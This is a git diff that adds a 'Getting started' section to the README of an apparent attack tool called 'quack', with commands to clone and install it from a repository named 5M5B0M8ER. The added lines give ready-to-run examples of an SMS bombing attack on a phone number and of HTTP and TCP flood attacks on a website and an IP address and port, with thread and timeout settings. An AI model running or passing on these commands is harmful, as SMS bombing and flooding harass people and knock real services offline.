@@ -36,7 +36,30 @@ tool, HTTP attack tool and many other attack tools.
 ***
 
 # Getting started
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+For Linux CLI Installation
+------------------------
+sudo apt-get update
+sudo apt-get install git
 
+
+sudo apt install git
+sudo git clone https://github.com/vikashmobileclinic/5M5B0M8ER.git
+cd 5M5B0M8ER
+chmod +x install.sh
+./install.sh
+quack -h   <For Help>
+
+
+Example of the SMS attack
+quack --tool SMS --target 12345678901 --timeout 20 --threads 50  {<12345678901Mobile No With Country Code> <20 Time> <50 SMS Count>}
+
+Example of the HTTP attack
+quack --tool HTTP --target http://example.com/ --timeout 10 --threads 10
+
+Example of the TCP attack
+quack --tool TCP --target 192.168.1.100:80 --timeout 10 --threads 10
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ## Quack installation
 
 > cd quack
